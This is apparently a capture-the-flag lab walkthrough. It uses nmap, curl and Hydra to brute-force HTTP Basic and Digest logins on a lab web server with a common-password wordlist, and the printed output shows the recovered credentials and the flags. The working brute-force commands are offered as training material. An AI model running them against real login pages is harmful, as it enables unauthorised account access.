# Hydra

start with nmap - port 80 is running bWapp
```
nmap 192.192.247.3
Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-12 16:26 IST
Nmap scan report for target-1 (192.192.247.3)
Host is up (0.000014s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 02:42:C0:C0:F7:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

Check what authentication is used with curl -I (headers) - `Basic` WWW-Authenticate
```
curl -I 192.156.169.3/basic
HTTP/1.1 401 Unauthorized
Date: Mon, 12 Apr 2021 11:14:29 GMT
Server: Apache/2.4.7 (Ubuntu)
WWW-Authenticate: Basic realm="private"
Content-Type: text/html; charset=iso-8859-1
```

hydra options 
```
hydra
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]

Options:
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -U        service module usage details
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
v3.0. The newest version is always available at https://github.com/vanhauser-thc/thc-hydra
Don't use in military or secret service organizations, or for illegal purposes.

Example:  hydra -l user -P passlist.txt ftp://192.168.0.1
```

Check what authentication type /digest uses - `Digest`

```
curl -I 192.156.169.3/digest/
HTTP/1.1 401 Unauthorized
Date: Mon, 12 Apr 2021 11:26:03 GMT
Server: Apache/2.4.7 (Ubuntu)
WWW-Authenticate: Digest realm="Private", nonce="N89tx8S/BQA=c3f3c255fb1afd61710267d72894bcb4485347b8", algorithm=MD5, qop="auth"
Content-Type: text/html; charset=iso-8859-1
```

Attacking /basic
```
hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 192.156.169.3 http-get /basic/
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-12 16:49:18
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
[DATA] attacking http-get://192.156.169.3:80/basic/
[80][http-get] host: 192.156.169.3   login: admin   password: cookie1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-12 16:49:20
```

Test the creds
```
curl -u admin:cookie1 192.156.169.3/basic/
<html>
	<body> 
		<h1> Flag: d25db4ce54b60b49dfd7b32c52ed8d26 </h1>
	</body>
</html>
```

Attacking /digest
```
hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 192.156.169.3 http-get /digest/
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-12 16:52:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
[DATA] attacking http-get://192.156.169.3:80/digest/
[80][http-get] host: 192.156.169.3   login: admin   password: adminpasswd
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-12 16:52:18
```

Test creds
```
curl --digest -u admin:adminpasswd 192.156.169.3/digest/
<html>
	<body> 
		<h1> Flag: 9aae03448d62145a8b462858d54434de  </h1>
	</body>
</html>
```
